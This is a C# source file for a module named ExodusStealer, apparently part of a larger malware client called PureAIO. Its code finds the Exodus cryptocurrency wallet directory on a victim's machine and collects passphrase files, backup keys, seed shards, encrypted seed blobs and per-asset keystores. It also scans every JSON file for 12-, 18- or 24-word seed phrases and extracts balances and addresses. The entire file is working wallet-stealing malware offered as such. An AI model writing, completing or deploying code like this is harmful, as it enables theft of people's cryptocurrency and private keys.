// ExodusStealer — extracts keys, seeds, and balance data from Exodus wallet.
// Collects:
//   • passphrase.json, backupkey.json, seed_shard_*.json, *.seco blobs
//   • per-asset wallet.json / keystore.json / keys.seco
//   • BIP-39 seed phrases via regex over all JSON files
//   • Balance data: parses info.json and per-asset *.wallet.json for balances

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using PureAIO.Client.Util;

namespace PureAIO.Client.Stealers
{
    public static class ExodusStealer
    {
        private static readonly string _walletRoot = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            @"Exodus\exodus.wallet");

        // ── Entry point ───────────────────────────────────────────────────────
        public static (List<ExodusDataEntry> items, List<ExodusBalance> balances) Collect()
        {
            var items    = new List<ExodusDataEntry>();
            var balances = new List<ExodusBalance>();

            if (!Directory.Exists(_walletRoot)) return (items, balances);

            Try(() => CollectRootFiles(_walletRoot, items));
            Try(() => CollectAssetDirs(_walletRoot, items));
            Try(() => ScanForSeedPhrases(_walletRoot, items));
            Try(() => ParseBalances(_walletRoot, balances));

            // Backup directories
            foreach (var backupDir in Directory.GetDirectories(_walletRoot, "*.backup"))
                Try(() => CollectRootFiles(backupDir, items, prefix: "backup:"));

            return (items, balances);
        }

        // ── Root-level key files ───────────────────────────────────────────────
        private static readonly string[] _rootFiles =
        {
            "passphrase.json", "backupkey.json", "seed.seco",
            "keystore.json",   "info.json",
        };

        private static void CollectRootFiles(string dir, List<ExodusDataEntry> items,
                                             string prefix = "")
        {
            foreach (var name in _rootFiles)
            {
                var path = Path.Combine(dir, name);
                if (!File.Exists(path)) continue;
                var val = ReadFileValue(path);
                if (val != null)
                    items.Add(new ExodusDataEntry
                    {
                        Kind   = prefix + Path.GetFileNameWithoutExtension(name),
                        Wallet = "all",
                        Value  = val
                    });
            }

            // All *.seco at root (encrypted seeds)
            foreach (var seco in Directory.GetFiles(dir, "*.seco"))
            {
                var val = TryCollectSecoFile(seco);
                if (val != null)
                    items.Add(new ExodusDataEntry
                    {
                        Kind   = prefix + "seco",
                        Wallet = Path.GetFileNameWithoutExtension(seco),
                        Value  = val
                    });
            }

            // seed_shard_*.json — Shamir shares
            foreach (var shard in Directory.GetFiles(dir, "seed_shard_*.json"))
            {
                var val = ReadFileValue(shard);
                if (val != null)
                    items.Add(new ExodusDataEntry
                    {
                        Kind   = prefix + "seed_shard",
                        Wallet = Path.GetFileNameWithoutExtension(shard),
                        Value  = val
                    });
            }
        }

        // ── Per-asset directories ─────────────────────────────────────────────
        private static void CollectAssetDirs(string root, List<ExodusDataEntry> items)
        {
            foreach (var dir in Directory.GetDirectories(root))
            {
                var ticker = Path.GetFileName(dir).ToUpperInvariant();

                foreach (var wj in Directory.GetFiles(dir, "*.wallet.json"))
                {
                    var val = ReadFileValue(wj);
                    if (val != null)
                        items.Add(new ExodusDataEntry
                        {
                            Kind   = "wallet_json",
                            Wallet = ticker,
                            Value  = val
                        });
                }

                foreach (var kj in Directory.GetFiles(dir, "*.keystore.json"))
                {
                    var val = ReadFileValue(kj);
                    if (val != null)
                        items.Add(new ExodusDataEntry
                        {
                            Kind   = "keystore_json",
                            Wallet = ticker,
                            Value  = val
                        });
                }

                foreach (var ks in Directory.GetFiles(dir, "*.keys.seco"))
                {
                    var val = TryCollectSecoFile(ks);
                    if (val != null)
                        items.Add(new ExodusDataEntry
                        {
                            Kind   = "keys_seco",
                            Wallet = ticker,
                            Value  = val
                        });
                }
            }
        }

        // ── BIP-39 seed scan ──────────────────────────────────────────────────
        // Matches 12, 18, or 24-word sequences from the standard BIP-39 word list
        private static readonly Regex _seedRx = new Regex(
            @"\b(?:[a-z]+\s+){11,23}[a-z]+\b",
            RegexOptions.Compiled | RegexOptions.IgnoreCase);

        private static void ScanForSeedPhrases(string root, List<ExodusDataEntry> items)
        {
            foreach (var json in Directory.GetFiles(root, "*.json", SearchOption.AllDirectories))
            {
                Try(() =>
                {
                    var text = File.ReadAllText(json, Encoding.UTF8);
                    foreach (Match m in _seedRx.Matches(text))
                    {
                        var words = m.Value.Trim().Split(
                            new[] { ' ', '\t', '\r', '\n' },
                            StringSplitOptions.RemoveEmptyEntries);
                        if (words.Length != 12 && words.Length != 18 && words.Length != 24)
                            continue;
                        items.Add(new ExodusDataEntry
                        {
                            Kind   = "seed_phrase",
                            Wallet = Path.GetFileName(json),
                            Value  = string.Join(" ", words)
                        });
                    }
                });
            }
        }

        // ── Balance parsing ───────────────────────────────────────────────────
        // info.json layout (Exodus 25.x):
        // { "assets": { "BTC": { "name":"Bitcoin","balance":"0.001","fiatValue":"65.00",
        //                        "address":"bc1q...", "enabled": true }, ... } }
        private static void ParseBalances(string root, List<ExodusBalance> balances)
        {
            var infoPath = Path.Combine(root, "info.json");
            if (!File.Exists(infoPath)) return;

            var json = File.ReadAllText(infoPath, Encoding.UTF8);

            // Extract the "assets" block
            var assetsBlock = SimpleJson.ExtractBlock(json, "assets");
            if (assetsBlock == null) return;

            // For each ticker key inside the block
            var tickerRx = new Regex(@"""([A-Z0-9_]{1,20})""\s*:\s*\{([^{}]*(?:\{[^{}]*\}[^{}]*)*)\}",
                                     RegexOptions.Compiled);

            foreach (Match tm in tickerRx.Matches(assetsBlock))
            {
                var ticker  = tm.Groups[1].Value;
                var content = tm.Groups[2].Value;

                var bal = new ExodusBalance
                {
                    Ticker    = ticker,
                    Name      = SimpleJson.GetString(content, "name")     ?? ticker,
                    Balance   = SimpleJson.GetString(content, "balance")  ?? SimpleJson.GetString(content, "confirmedBalance"),
                    FiatValue = SimpleJson.GetString(content, "fiatValue") ?? SimpleJson.GetString(content, "fiatBalance"),
                    Address   = SimpleJson.GetString(content, "address")   ?? SimpleJson.GetString(content, "receiveAddress"),
                    IsEnabled = SimpleJson.GetBool(content,  "enabled"),
                };

                // Skip completely empty entries
                if (string.IsNullOrEmpty(bal.Balance) && string.IsNullOrEmpty(bal.Address))
                    continue;

                balances.Add(bal);
            }

            // Fallback: per-asset wallet.json files for balance if not in info.json
            foreach (var dir in Directory.GetDirectories(root))
            {
                var t = Path.GetFileName(dir).ToUpperInvariant();
                if (balances.Exists(b => b.Ticker == t)) continue;

                foreach (var wj in Directory.GetFiles(dir, "*.wallet.json"))
                {
                    Try(() =>
                    {
                        var wJson = File.ReadAllText(wj, Encoding.UTF8);
                        var addr  = SimpleJson.GetString(wJson, "address")
                                 ?? SimpleJson.GetString(wJson, "receiveAddress");
                        var bbal  = SimpleJson.GetString(wJson, "balance")
                                 ?? SimpleJson.GetString(wJson, "confirmedBalance");
                        if (addr == null && bbal == null) return;
                        balances.Add(new ExodusBalance
                        {
                            Ticker  = t,
                            Name    = t,
                            Balance = bbal,
                            Address = addr,
                        });
                    });
                }
            }
        }

        // ── File helpers ──────────────────────────────────────────────────────
        private static string ReadFileValue(string path)
        {
            try { return File.ReadAllText(path, Encoding.UTF8).Trim(); }
            catch { return null; }
        }

        private static string TryCollectSecoFile(string path)
        {
            try
            {
                // Try as UTF-8 text first (some versions store JSON)
                var text = File.ReadAllText(path, Encoding.UTF8).Trim();
                if (text.StartsWith("{") || text.StartsWith("["))
                    return text;
                // Otherwise return base64-encoded raw bytes
                return Convert.ToBase64String(File.ReadAllBytes(path));
            }
            catch { return null; }
        }

        private static void Try(Action a) { try { a(); } catch { } }
    }
}
